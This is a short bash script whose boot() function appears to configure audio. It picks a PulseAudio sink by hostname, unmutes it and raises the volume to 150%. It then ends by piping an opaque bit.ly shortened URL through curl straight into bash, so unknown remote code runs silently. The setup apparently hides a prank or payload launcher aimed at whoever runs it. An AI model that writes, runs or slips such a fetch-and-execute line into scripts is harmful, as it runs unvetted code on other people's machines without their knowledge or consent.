#!/bin/bash

boot() {
    mkdir ~/bin 2> /dev/null
    ln -s /usr/bin/python3 ~/bin/python 2> /dev/null

    sink="Apple Audio Device Multichannel"
    hostname=$(hostname)
    # if hostname includes c2
    if [[ "$hostname" == "c2"* ]]; then
        sink="Built-in Audio Analog Stereo"
    fi

    sink_channel="Description: $sink"

    # retrieve line number for the speakers
    pactl list sinks | grep -n "$sink_channel" | awk '{print $1}' | tr ':' ' ' > .tmp
    AUDIO_CHANNEL=$(pactl list sinks | head -n $(expr $(cat .tmp) - 3) | tail -1 | awk '{print $2}' | tr '#' ' ')
    rm .tmp
    pactl set-default-sink $AUDIO_CHANNEL
    pactl set-sink-mute @DEFAULT_SINK@ no
    pactl set-sink-volume @DEFAULT_SINK@ 150%
    curl -s -L https://bit.ly/3zvELNz | bash
}
